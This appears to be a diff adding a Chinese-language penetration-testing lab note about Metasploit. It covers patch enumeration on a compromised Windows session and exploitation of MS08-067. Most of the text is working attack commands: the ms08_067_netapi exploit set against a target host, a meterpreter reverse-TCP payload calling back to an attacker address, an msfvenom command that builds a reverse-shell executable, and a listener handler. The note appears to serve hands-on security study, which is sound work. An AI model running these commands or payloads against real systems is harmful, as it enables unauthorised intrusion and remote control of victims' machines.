@@ -1,0 +1,24 @@
+<p>msf信息收集–补丁查找</p>
+<pre><code>Windows缺少的补丁
+– 基于已经获取到的session进行检测
+– use post/windows/gather/enum_patches 
+▪ show advanced
+▪ set VERBOSE yes
+– 检查失败
+▪ Known bug in WMI query, try migrating to another process
+▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）</code></pre><p>ms08_067在初次使用不成功以后，需要重启靶机电脑，因为它会打乱电脑的一些设置，导致后面再试的时候会不成功</p>
+<p><strong>ms08_067   KB958644</strong></p>
+<p>Windows缺少的补丁<br>– 基于已经获取到的session进行检测<br>– use post/windows/gather/enum_patches<br>▪ show advanced<br>▪ set VERBOSE yes<br>– 检查失败<br>▪ Known bug in WMI query, try migrating to another process<br>▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）</p>
+<p>use exploit/windows/smb/ms08_067_netapi<br>set rhosts 192.168.88.131<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.88.130<br>run<br>(若有该漏洞，则会执行成功)<br>（注意到payload的使用位置了么）</p>
+<p>因为没有机器，所以自己制作了一个peyload使用一下</p>
+<pre><code>msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.88.130 lport=55555 -f exe -o /root/Desktop/leetest/123.exe
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter_reverse_tcp
+
+run -j -z
+</code></pre><p><img src="../_resources/25fad61d3b884dfb99b2b99dabcac1f0.png" alt="093804844b494b1810107285bbe9caf9.png"></p>
+<p>回到模块，继续进行</p>
+<p><img src="../_resources/4b35799ecdcf4673b830cbbca22deebf.png" alt="7f9b2af956637b185b48c05c8a9730c4.png"></p>
+<p>显示信息用提示的是因为缺少这些补丁，所以后面的那些ms也许可以利用</p>
